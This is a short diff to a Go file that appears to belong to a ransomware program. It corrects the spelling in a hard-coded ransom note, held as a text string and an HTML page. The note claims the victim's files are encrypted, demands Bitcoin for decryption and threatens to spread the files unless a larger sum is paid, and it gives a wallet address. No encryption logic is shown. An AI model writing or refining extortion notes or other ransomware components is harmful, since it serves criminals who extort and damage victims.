@@ -6,7 +6,7 @@ import (
 	"os/user"
 )
 
-var textForTxt = "YOUR FILES HAVE BEEN ENCRYPTED\n\nTo encrypt your files you have pay ransom.\nThe ransom must be paid in Bitcoin!\nThe amount of ransom that has to be baid in order to decrypt your files is 0.005 Bitcoin.\nThe amount of ransom that has to be baid in order to not spread your files is 0.01 Bitcoin.\nYou can send them to 1aChInoBitWallet123321"
+var textForTxt = "YOUR FILES HAVE BEEN ENCRYPTED\n\nTo encrypt your files you have pay ransom.\nThe ransom must be paid in Bitcoin!\nThe amount of ransom that has to be paid in order to decrypt your files is 0.005 Bitcoin.\nThe amount of ransom that has to be paid in order to not spread your files is 0.01 Bitcoin.\nYou can send them to 1aChInoBitWallet123321"
 var textForHtml = "<html lang='en'>" +
 	"<head>" +
 	"<meta charset='UTF-8'>" +
@@ -17,8 +17,8 @@ var textForHtml = "<html lang='en'>" +
 	"<h1>YOUR FILES HAVE BEEN ENCRYPTED</h1>" +
 	"<h2>To encrypt your files you have pay ransom.</h2>" +
 	"<p>The ransom must be paid in Bitcoin!<br>" +
-	"The amount of ransom that has to be baid in order to decrypt your files is 0.005 Bitcoin.<br>" +
-	"The amount of ransom that has to be baid in order to not spread your files is 0.01 Bitcoin.<br>" +
+	"The amount of ransom that has to be paid in order to decrypt your files is 0.005 Bitcoin.<br>" +
+	"The amount of ransom that has to be paid in order to not spread your files is 0.01 Bitcoin.<br>" +
 	"You can send them to 1aChInoBitWallet123321<br>" +
 	"</p>" +
 	"</body>" +
